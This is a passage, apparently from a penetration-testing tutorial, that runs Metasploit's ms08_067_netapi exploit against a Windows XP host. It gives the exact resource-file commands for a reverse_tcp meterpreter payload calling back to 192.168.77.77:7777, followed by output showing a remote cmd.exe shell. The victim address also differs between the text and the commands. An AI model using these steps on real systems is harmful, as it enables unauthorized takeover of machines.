for instance, if we want to attack a target at our victim host 192.168.13.37 using 
the ms08_067_netapi (Conficker) exploit in order to deliver a shell back to our 
host at 192.168.77.77 on TCP port 7777. 

use exploit/windows/smb/ms08_067_netapi

set RHOST 192.168.1.37

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 192.168.77.77

set LPORT 7777

exploit –j –z


To  utilize  Metasploit's  attack,  we  first  chose  our  exploit  (exploit/windows/
smb/ms08_067_netapi)  and  then  set  the  target  to  192.168.1.37.  Following 
target selection, we indicated the payload as windows/meterpreter/reverse_tcp 
and selected a reverse connection to our host at 192.168.77.77 on port 7777. 
Finally, we told Metasploit to exploit the system. Saving the configuration file 
to the filename conficker.rc, we can now launch our attack by issuing the command msfconsole –r conficker.rc. This command will tell Metasploit to launch 
with the conficker.rc configuration file. When successful, our attack returns a 
Windows command shell to control the machine.
attacker$ msfconsole -r conficker.rc

[*] Exploit running as background job.

[*] Started reverse handler on 192.168.77.77:7777

[*] Automatically detecting the target...

[*] Fingerprint: Windows XP - Service Pack 2 - lang:English

[*] Selected Target: Windows XP SP2 English (AlwaysOn NX)

[*] Attempting to trigger the vulnerability...

[*] Sending stage (752128 bytes) to 192.168.1.37

[*] Meterpreter session 1 opened (192.168.77.77:7777 -> 

192.168.1.37:1087) at Fri Nov 11 15:35:05 -0700 2011

msf exploit(ms08_067_netapi) > sessions -i 1

[*] Starting interaction with 1...

meterpreter > execute -i -f cmd.exe

Process 2024 created.

Channel 1 created.

Microsoft Windows XP [Version 5.1.2600]